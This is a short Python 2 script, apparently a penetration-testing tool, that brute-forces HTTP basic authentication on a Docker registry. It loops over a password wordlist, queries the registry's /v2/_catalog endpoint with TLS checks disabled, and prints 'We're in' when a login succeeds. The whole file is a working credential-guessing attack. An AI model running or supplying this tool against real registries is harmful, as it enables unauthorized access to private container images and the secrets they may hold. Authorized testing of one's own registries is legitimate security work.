#!/usr/bin/python
# Brute force tool for Docker registry server

import sys
import requests
import argparse

# Annoying TLS warnings
requests.packages.urllib3.disable_warnings()


def run_brute_attack(USERNAME, PASSWORD):
    """Run our brute force attack"""

    # Adjust this as necessary
    URL = "https://testregistry.example.com/v2/_catalog"

    print "[INFO] Requesting with password: " + PASSWORD,
    resp = requests.get(URL, auth=(USERNAME, PASSWORD), verify=False)

    if resp.status_code == 401:
        print "[ERROR] Auth failed :("
    elif resp.status_code == 200:
        # print "[DATA] " + resp.text
        print "[SUCCESS] We're in"
    else:
        print "[ERROR] Something has gone horrily wrong :("
        print resp.text


def parse_passwords(PASSWORDLIST):
    """Parse out our password list"""
    print "[INFO] Parsing password list"
    passwords = []
    try:
        with open(PASSWORDLIST, 'r') as fh:
            data = fh.readlines()
            for item in data:
                password = item.split()[0]
                # print "[INFO] Adding " + password
                passwords.append(password)
    except:
        sys.exit("[ERROR] Problem parsing password list")

    print "[INFO] Total passwords: " + str(len(passwords))

    return passwords


def __main__():
    """Get this party started"""
    parser = argparse.ArgumentParser(description='Docker Registry Brute Forcer')
    parser.add_argument('--username', '-u', dest='username', help='username to use')
    parser.add_argument('--password-list', '-p', dest='passwordlist', help='Password wordlist file')
    parser.add_argument('--version', '-v', action='version', version='%(prog)s 0.1')
    args = parser.parse_args()
    USERNAME = args.username
    PASSWORDLIST = args.passwordlist

    if not args.passwordlist:
        sys.exit(parser.print_help())
    else:
        passwords = parse_passwords(PASSWORDLIST)
        for password in passwords:
            run_brute_attack(USERNAME, password)


if __name__ == '__main__':
    __main__()
